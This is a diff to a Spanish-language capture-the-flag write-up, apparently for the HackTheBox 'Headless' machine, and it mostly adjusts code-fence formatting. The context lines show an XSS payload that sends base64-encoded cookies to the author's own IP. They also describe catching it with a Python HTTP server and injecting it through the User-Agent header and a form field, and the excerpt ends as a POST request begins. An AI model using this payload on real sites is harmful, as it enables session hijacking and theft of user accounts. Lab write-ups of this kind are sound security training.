@@ -183,10 +183,12 @@ Como vemos tenemos `/dashboard` que da un código de estado 500(Internal Server 
 ![Pasted image 20240724112252.png](../assets/images-Headless/Headless5.png)
 
 Por lo tanto decido volver a intentar a inyectar payloads `XSS` de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) luego de varios intentemos vemos que funciona.
-```
+
+```js
 <script>document.location="http://10.10.16.36/xss-76.js?cookie="+btoa(document.cookie);</script>
 ```
 Como vemos en el payload donde pone `10.10.16.36` es mi IP lo que hacemos es montar un servidor con `python3 -m http.server 80`, lo siguiente que hice es inyectar el payload en el User-Agent pero para que esto funcione y poder robar la Cookie tenemos que ingresar el mismo payload en algún parámetro del formulario, con esto lo que hacemos es que pueda saltar las alertas de intento de hackeo(Hacking Attempt Detected) y sea revisado por el "administrador"
+
 ```
 POST /support HTTP/1.1
 Host: 10.10.11.8:5000
